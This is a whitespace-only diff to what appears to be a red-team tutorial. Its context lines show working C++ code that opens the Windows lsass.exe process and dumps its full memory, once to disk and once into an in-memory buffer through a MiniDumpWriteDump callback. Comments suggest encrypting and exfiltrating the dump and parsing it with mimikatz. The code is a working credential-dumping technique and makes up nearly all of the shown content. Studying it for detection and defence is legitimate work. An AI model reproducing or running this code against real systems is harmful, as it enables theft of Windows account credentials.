@@ -28,12 +28,12 @@ using namespace std;
 
 int main() {
 	DWORD lsassPID = 0;
-	HANDLE lsassHandle = NULL; 
+	HANDLE lsassHandle = NULL;
 
 	// Open a handle to lsass.dmp - this is where the minidump file will be saved to
 	HANDLE outFile = CreateFile(L"lsass.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 
-	// Find lsass PID	
+	// Find lsass PID
 	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 	PROCESSENTRY32 processEntry = {};
 	processEntry.dwSize = sizeof(PROCESSENTRY32);
@@ -47,17 +47,17 @@ int main() {
 		}
 		wcout << "[+] Got lsass.exe PID: " << lsassPID << endl;
 	}
-	
+
 	// Open handle to lsass.exe process
 	lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, lsassPID);
-	
+
 	// Create minidump
 	BOOL isDumped = MiniDumpWriteDump(lsassHandle, lsassPID, outFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
-	
+
 	if (isDumped) {
 		cout << "[+] lsass dumped successfully!" << endl;
 	}
-	
+
     return 0;
 }
 ```
@@ -153,22 +153,22 @@ BOOL CALLBACK minidumpCallback(
 		// Gets called for each lsass process memory read operation
 		case IoWriteAllCallback:
 			callbackOutput->Status = S_OK;
-			
-			// A chunk of minidump data that's been jus read from lsass. 
+
+			// A chunk of minidump data that's been jus read from lsass.
 			// This is the data that would eventually end up in the .dmp file on the disk, but we now have access to it in memory, so we can do whatever we want with it.
 			// We will simply save it to dumpBuffer.
 			source = callbackInput->Io.Buffer;
-			
+
 			// Calculate location of where we want to store this part of the dump.
 			// Destination is start of our dumpBuffer + the offset of the minidump data
 			destination = (LPVOID)((DWORD_PTR)dumpBuffer + (DWORD_PTR)callbackInput->Io.Offset);
-			
+
 			// Size of the chunk of minidump that's just been read.
 			bufferSize = callbackInput->Io.BufferBytes;
 			bytesRead += bufferSize;
-			
+
 			RtlCopyMemory(destination, source, bufferSize);
-			
+
 			printf("[+] Minidump offset: 0x%x; length: 0x%x\n", callbackInput->Io.Offset, bufferSize);
 			break;
 
@@ -202,7 +202,7 @@ int main() {
 	}
 
 	lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, lsassPID);
-	
+
 	// Set up minidump callback
 	MINIDUMP_CALLBACK_INFORMATION callbackInfo;
 	ZeroMemory(&callbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
@@ -212,19 +212,19 @@ int main() {
 	// Dump lsass
 	BOOL isDumped = MiniDumpWriteDump(lsassHandle, lsassPID, NULL, MiniDumpWithFullMemory, NULL, NULL, &callbackInfo);
 
-	if (isDumped) 
+	if (isDumped)
 	{
 		// At this point, we have the lsass dump in memory at location dumpBuffer - we can do whatever we want with that buffer, i.e encrypt & exfiltrate
 		printf("\n[+] lsass dumped to memory 0x%p\n", dumpBuffer);
 		HANDLE outFile = CreateFile(L"c:\\temp\\lsass.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-	
+
 		// For testing purposes, let's write lsass dump to disk from our own dumpBuffer and check if mimikatz can work it
 		if (WriteFile(outFile, dumpBuffer, bytesRead, &bytesWritten, NULL))
 		{
 			printf("\n[+] lsass dumped from 0x%p to c:\\temp\\lsass.dmp\n", dumpBuffer, bytesWritten);
 		}
 	}
-	
+
 	return 0;
 }
 ```
